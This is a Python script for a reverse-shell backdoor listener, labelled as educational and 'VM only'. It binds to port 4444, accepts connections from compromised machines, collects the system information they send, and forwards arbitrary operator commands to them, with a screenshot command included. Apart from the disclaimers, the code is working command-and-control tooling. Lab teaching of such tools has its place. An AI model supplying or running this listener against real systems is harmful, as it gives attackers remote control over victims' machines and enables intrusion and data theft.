#!/usr/bin/env python3
"""
Educational Backdoor Listener
For cybersecurity course - VM environment only
"""

import socket
import sys
import threading
import time

class Listener:
    def __init__(self, ip='0.0.0.0', port=4444):
        self.ip = ip
        self.port = port
        self.clients = []
        
    def start(self):
        """Start listening for incoming connections"""
        try:
            # Create socket
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.ip, self.port))
            self.server.listen(5)
            
            print("="*60)
            print("EDUCATIONAL BACKDOOR LISTENER")
            print("For Cybersecurity Course - VM Only")
            print("="*60)
            print(f"[*] Listening on {self.ip}:{self.port}")
            print("[*] Waiting for connections...")
            print("[*] Type 'help' for commands")
            print("="*60)
            
            while True:
                client_socket, client_addr = self.server.accept()
                print(f"\n[+] Connection received from {client_addr}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[!] Shutting down listener...")
            self.server.close()
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error: {e}")
            self.server.close()
            
    def handle_client(self, client_socket, client_addr):
        """Handle individual client connections"""
        try:
            # First receive system info sent by the shell on connect
            try:
                sys_info = client_socket.recv(4096).decode()
                print(sys_info)
            except Exception:
                pass

            print("[ Educational Reverse Shell - VM Environment Only ]")
            print("Type 'help' for available commands")

            while True:
                # Get command from user
                command = input(f"\n{client_addr} > ").strip()
                
                if command.lower() == 'exit':
                    client_socket.send(b'exit')
                    break
                    
                elif command.lower() == 'help':
                    self.show_help()
                    continue
                    
                elif command.lower() == 'screenshot':
                    # Educational screenshot capture (simulated)
                    client_socket.send(b'screenshot')
                    response = client_socket.recv(4096)
                    print(f"[*] Response: {response.decode()}")
                    continue
                
                # Send command to client
                if command:
                    client_socket.send(command.encode())
                    
                    # Receive response (larger buffer for long outputs)
                    response = client_socket.recv(65536).decode()
                    print(response)
                    
        except Exception as e:
            print(f"[!] Client connection error: {e}")
        finally:
            client_socket.close()
            print(f"[*] Connection from {client_addr} closed")
            
    def show_help(self):
        """Display help menu"""
        help_text = """
Available Commands:
------------------
system commands    - Execute any system command (ls, dir, whoami, etc.)
help              - Show this help menu
exit              - Close connection
screenshot        - Take screenshot (educational simulation)

Educational Purpose Only - Use in VM Environment
"""
        print(help_text)

if __name__ == "__main__":
    listener = Listener()
    listener.start()